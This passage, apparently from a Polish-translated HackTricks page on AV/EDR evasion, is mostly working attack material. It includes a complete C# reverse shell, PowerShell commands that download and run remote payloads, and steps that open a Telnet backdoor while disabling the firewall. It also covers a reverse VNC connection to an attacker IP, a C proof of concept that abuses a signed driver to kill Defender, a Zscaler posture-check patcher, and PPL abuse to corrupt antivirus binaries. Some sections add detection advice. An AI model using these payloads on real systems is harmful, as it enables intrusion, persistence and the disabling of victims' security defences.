Pozwalając na dostęp do Interpreter Binaries i środowiska na udziale SMB można **wykonać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itp. mamy **więcej elastyczności, by obejść statyczne sygnatury**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika pozwalająca atakującemu **manipulować access tokenem lub produktem zabezpieczającym takim jak EDR czy AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zginie, ale nie będzie miał uprawnień do sprawdzania złośliwej aktywności.

Aby temu zapobiec, Windows mógłby **zabronić zewnętrznym procesom** uzyskiwania uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia dostępu i utrzymania persystencji:
1. Pobierz z https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Uruchom podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić PIN bez użycia GUI).


## Advanced Evasion

Evasion to bardzo skomplikowany temat — czasami trzeba wziąć pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, z którym się zetkniesz, będzie mieć własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tej prezentacji od [@ATTL4S](https://twitter.com/DaniLJ94), aby zdobyć wgląd w bardziej zaawansowane techniki evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetna prezentacja od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwać części binarki**, aż **zidentyfikuje, którą część Defender uznaje za złośliwą** i rozdzieli ją dla ciebie.\
Innym narzędziem robiącym to samo jest [**avred**](https://github.com/dobin/avred) z otwartą usługą dostępną na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do czasu Windows10, wszystkie wersje Windows zawierały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Skonfiguruj, aby **uruchamiał się** przy starcie systemu i **uruchom go** teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz wersje binarne, nie instalator)

**ON THE HOST**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na maszynę **victim**

#### **Reverse connection**

The **attacker** powinien uruchomić na swoim **host** binarkę `vncviewer.exe -listen 5900`, aby była **prepared** do przechwycenia odwrotnego **VNC connection**. Następnie, na **victim**: uruchom demona `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję musisz unikać kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywoła to [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** poleceniem `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Aktualny Defender zakończy proces bardzo szybko.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# przy użyciu kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscators dla C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do tworzenia injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktu końcowego przed uruchomieniem ransomware. Narzędzie dostarcza **własny podatny, ale *signed* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji jądra, których nawet usługi Protected-Process-Light (PPL) AV nie potrafią zablokować.

Najważniejsze wnioski
1. **Signed driver**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to legalnie podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” Antiy Labs. Ponieważ sterownik ma ważny podpis Microsoft, jest ładowany nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **kernel service**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z poziomu user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Funkcja                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończyć dowolny proces po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunąć dowolny plik z dysku |
| `0x990001D0` | Odładować sterownik i usunąć usługę |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD całkowicie pomija ochrony w trybie użytkownika; kod wykonujący się w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów utwardzających.

Wykrywanie / Łagodzenie
•  Włącz listę blokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *kernel* services i generuj alerty, gdy sterownik jest ładowany z katalogu zapisywalnego przez każdego użytkownika lub nie znajduje się na liście dozwolonych.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń oraz następujące podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** wykonuje reguły sprawdzania stanu urządzenia (device-posture) lokalnie i polega na Windows RPC do komunikacji wyników z innymi komponentami. Dwa słabe wybory projektowe umożliwiają pełne obejście:

1. Ocena posture odbywa się **całkowicie po stronie klienta** (na serwer wysyłany jest tylko wynik jako wartość boolowska).  
2. Wewnętrzne endpointy RPC sprawdzają jedynie, czy łączący się plik wykonywalny jest **signed by Zscaler** (przez `WinVerifyTrust`).

Poprzez **załatowanie czterech podpisanych binarek na dysku** oba mechanizmy można zneutralizować:

| Binary | Oryginalna logika (załatana) | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | NOP-ed ⇒ dowolny (nawet niepodpisany) proces może powiązać się z pipe'ami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpiona przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominiete |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole zabezpieczeń wyświetlają **zielone/zgodne**.
* Niesygnowane lub zmodyfikowane binaria mogą otwierać endpointy RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto klientowe decyzje zaufania i proste sprawdzenia sygnatur mogą zostać pokonane kilkoma poprawkami bajtowymi.

## Nadużywanie Protected Process Light (PPL) do manipulacji AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisujący/poziom, tak że tylko chronione procesy o równym lub wyższym poziomie mogą modyfikować inne. Z punktu widzenia ofensywnego, jeśli możesz legalnie uruchomić binarkę z włączonym PPL i kontrolować jej argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. logowanie) w ograniczony, wspierany przez PPL prymityw zapisu do chronionych katalogów używanych przez AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Narzędzie open-source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` sam się uruchamia i akceptuje parametr pozwalający zapisać plik dziennika w ścieżce wskazanej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z obsługą PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj ścieżek 8.3, aby wskazać zwykle chronione lokalizacje.

8.3 short path helpers
- List short names: `dir /x` w każdym katalogu nadrzędnym.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować treści, które zapisuje ClipUp poza miejscem zapisu; ten prymityw nadaje się do korumpowania plików, a nie do precyzyjnego wstrzykiwania zawartości.
- Wymaga lokalnego administratora/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na restart.
- Czasowanie jest krytyczne: cel nie może być otwarty; wykonanie podczas rozruchu unika blokad plików.

Wykrycia
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jest potomkiem niestandardowych programów uruchamiających, w okresie rozruchu.
- Nowe usługi skonfigurowane do autostartu podejrzanych binarek i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed błędami uruchamiania Defendera.
- Monitorowanie integralności plików w katalogach binarek/Platform Defendera; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anormalnego wykorzystania poziomu PPL przez binarki niebędące AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi procesami macierzystymi; blokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług autostartu i monitoruj manipulacje kolejnością uruchamiania.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach hostujących narzędzia zabezpieczające, jeśli jest to zgodne z Twoim środowiskiem (testuj dokładnie).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
